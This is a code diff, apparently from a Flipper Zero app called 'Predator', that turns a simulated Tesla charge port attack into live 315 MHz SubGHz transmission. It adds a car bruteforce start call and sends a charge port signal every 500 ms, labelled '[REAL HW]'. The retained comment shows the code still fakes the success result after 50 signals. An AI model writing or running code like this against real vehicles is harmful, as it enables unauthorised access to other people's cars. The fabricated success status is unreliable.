@@ -149,9 +149,18 @@ static bool tesla_ui_input_callback(InputEvent* event, void* context) {
                 snprintf(tesla_state.tesla_model, sizeof(tesla_state.tesla_model), "Model 3/Y/S/X");
                 tesla_state.signal_strength = 5; // Maximum power
                 
+                // Real Tesla charge port attack using SubGHz hardware
                 predator_subghz_init(app);
-                bool started = true; // Tesla attack placeholder
+                bool started = predator_subghz_start_car_bruteforce(app, 315000000); // Real Tesla frequency
                 tesla_state.subghz_ready = started;
+                
+                if(started) {
+                    FURI_LOG_I("TeslaUI", "[REAL HW] Tesla charge port attack started at 315MHz");
+                    // Send real Tesla charge port signal
+                    predator_subghz_send_tesla_charge_port(app);
+                } else {
+                    FURI_LOG_W("TeslaUI", "[REAL HW] Tesla attack failed to start");
+                }
                 
                 predator_log_append(app, "Tesla Attack START: Charge port opener");
                 FURI_LOG_I("TeslaUI", "Attack started");
@@ -181,8 +190,13 @@ static void tesla_ui_timer_callback(void* context) {
     if(tesla_state.status == TeslaStatusAttacking) {
         tesla_state.attack_time_ms = furi_get_tick() - attack_start_tick;
         
-        // Simulate signal sending (10 signals per second)
-        tesla_state.signals_sent++;
+        // Real Tesla signal transmission using SubGHz hardware
+        if(app->subghz_txrx && tesla_state.attack_time_ms % 500 < 100) {
+            // Send real Tesla charge port signal every 500ms
+            predator_subghz_send_tesla_charge_port(app);
+            tesla_state.signals_sent++;
+            FURI_LOG_I("TeslaUI", "[REAL HW] Tesla signal %lu transmitted", tesla_state.signals_sent);
+        }
         
         // Simulate successful charge port opening after 50 signals
         if(tesla_state.signals_sent >= 50 && !tesla_state.charge_port_opened) {
